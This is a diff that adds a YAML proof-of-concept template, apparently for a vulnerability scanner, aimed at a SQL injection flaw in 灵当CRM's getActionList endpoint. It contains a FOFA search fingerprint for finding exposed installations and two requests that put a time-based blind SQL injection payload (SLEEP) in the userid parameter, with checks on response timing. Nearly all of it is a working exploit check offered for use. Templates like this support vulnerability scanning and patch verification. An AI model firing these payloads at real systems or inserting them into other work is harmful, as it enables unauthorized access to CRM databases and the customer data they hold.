@@ -1,0 +1,26 @@
+id: poc-yaml-51mis-crm-getactionList-userid-sqli
+info:
+  name: 灵当CRM getActionList userid SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{.t1}})))HtiS)--%20cbVc--+
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\"\") &&\ncontains(body,\"\
+    \\\"code\\\":1\") &&\ncontains(body,\"\\\"msg\\\":\\\"success\\\"\") &&\nduration\
+    \ >= t1 &&\nduration <= t2 &&\n!contains(body,\"<\")\n"
+- method: GET
+  path: /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&userid=%27%20AND%20(SELECT%203408%20FROM%20(SELECT(SLEEP({{.t3}})))HtiS)--%20cbVc--+
+  expression: "status_code == 200 && \ncontains(body,\"\\\"result\\\"\") &&\ncontains(body,\"\
+    \\\"code\\\":1\") &&\ncontains(body,\"\\\"msg\\\":\\\"success\\\"\") &&\nduration\
+    \ >= t3 &&\nduration <= t4 &&\n!contains(body,\"<\")\n"
+transport: http
